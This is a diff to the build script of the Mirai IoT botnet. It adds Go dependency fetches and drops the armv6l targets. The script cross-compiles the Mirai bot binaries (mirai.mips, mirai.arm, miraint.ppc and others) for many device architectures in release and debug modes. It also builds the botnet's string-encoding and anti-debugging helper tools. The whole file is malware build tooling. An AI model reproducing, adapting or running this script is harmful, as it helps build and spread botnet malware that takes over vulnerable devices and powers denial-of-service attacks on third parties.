@@ -1,4 +1,6 @@
 #!/bin/bash
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
 
 FLAGS=""
 
@@ -29,7 +31,6 @@ elif [ "$1" == "release" ]; then
     compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
-    compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
@@ -40,7 +41,6 @@ elif [ "$1" == "release" ]; then
     compile_bot mipsel miraint.mpsl "-static"
     compile_bot armv4l miraint.arm "-static"
     compile_bot armv5l miraint.arm5n " "
-    compile_bot armv6l miraint.arm7 "-static"
     compile_bot powerpc miraint.ppc "-static"
     compile_bot sparc miraint.spc "-static"
     compile_bot m68k miraint.m68k "-static"
@@ -51,7 +51,6 @@ elif [ "$1" == "debug" ]; then
     gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
     mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
     armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
-    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
     sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
     gcc -std=c99 tools/enc.c -g -o debug/enc
     gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
